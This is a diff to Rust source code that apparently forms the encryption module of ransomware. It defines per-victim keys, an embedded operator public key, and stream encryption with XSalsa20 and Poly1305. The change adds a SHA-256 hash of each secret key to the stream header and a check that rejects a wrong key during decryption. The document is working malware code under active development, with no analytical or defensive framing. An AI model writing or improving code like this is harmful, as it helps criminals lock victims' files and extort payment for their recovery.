@@ -6,19 +6,19 @@ use dryoc::dryocbox;
 use dryoc::dryocbox::DryocBox;
 use dryoc::dryocsecretbox;
 use dryoc::kdf;
-use dryoc::types::{ByteArray, NewByteArray, StackByteArray};
+use dryoc::types::{ByteArray, NewByteArray};
 use poly1305::universal_hash::{KeyInit, UniversalHash};
 use poly1305::Poly1305;
 use salsa20::cipher::{KeyIvInit, StreamCipher};
 use salsa20::XSalsa20;
+use sha2::{Sha256, Digest};
 use uuid::Uuid;
 use zeroize::Zeroize;
 
 const BLOCK_SIZE: usize = 2000;
 static OPERATOR_PUBLIC_KEY: &'static [u8; 32] = include_bytes!("../assets/operator_public_key.bin");
 
-type StreamKey = StackByteArray<32>;
-
+#[derive(Clone)]
 pub struct PerVictimKey {
     victim_id: Uuid,
     secret_key: dryocsecretbox::Key,
@@ -93,6 +93,7 @@ impl PerVictimKey {
 }
 
 pub struct EncryptedStreamHeader {
+    sk_sha256: [u8; 32],
     nonce: dryoc::dryocsecretbox::Nonce,
     tag: [u8; 16],
 }
@@ -100,6 +101,7 @@ pub struct EncryptedStreamHeader {
 impl EncryptedStreamHeader {
     pub fn to_vec(self: &Self) -> Vec<u8> {
         let mut v = Vec::new();
+        v.extend_from_slice(&self.sk_sha256);
         v.extend_from_slice(self.nonce.as_array());
         v.extend_from_slice(&self.tag);
         v
@@ -113,6 +115,7 @@ pub fn encrypt_stream(
 ) -> std::io::Result<EncryptedStreamHeader> {
     // This is basically hand-rolled dryoc::secretbox::SecretBox, but works on stream.
     let mut header = EncryptedStreamHeader {
+        sk_sha256: Sha256::digest(&key.secret_key.as_array()).into(),
         nonce: dryoc::dryocsecretbox::Nonce::gen(),
         tag: [0; 16],
     };
@@ -144,6 +147,12 @@ fn decrypt_stream(
     input: &mut impl std::io::Read,
     output: &mut impl std::io::Write,
 ) -> std::io::Result<()> {
+    if Sha256::digest(key.secret_key.as_array()) != header.sk_sha256.into() {
+        return Err(std::io::Error::new(
+            std::io::ErrorKind::InvalidData,
+            "Wrong secret key",
+        ));
+    }
     let mut cipher = XSalsa20::new(
         key.secret_key.as_array().into(),
         header.nonce.as_array().into(),
